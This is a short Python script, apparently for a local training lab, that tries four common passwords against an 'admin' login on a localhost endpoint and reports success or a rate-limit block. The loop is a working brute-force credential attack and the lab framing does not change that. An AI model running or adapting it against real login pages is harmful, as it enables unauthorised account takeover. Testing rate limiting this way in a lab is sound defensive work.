import requests

URL = "http://127.0.0.1:5000/login"

username = "admin"

# Small wordlist for local training only
passwords = [
    "123456",
    "password",
    "admin",
    "Training123!"
]

print("======================================")
print("   LOCAL BRUTE-FORCE SIMULATOR")
print("======================================")

for password in passwords:

    data = {
        "username": username,
        "password": password
    }

    response = requests.post(URL, data=data)

    print(f"\nTrying password: {password}")
    print(f"Status code: {response.status_code}")
    print(f"Response: {response.text}")

    if response.status_code == 200:
        print("\n[+] Training password found.")
        print("[+] Simulation completed.")
        break

    if response.status_code == 429:
        print("\n[!] RATE LIMIT ACTIVATED")
        print("[!] Further attempts are blocked.")
        break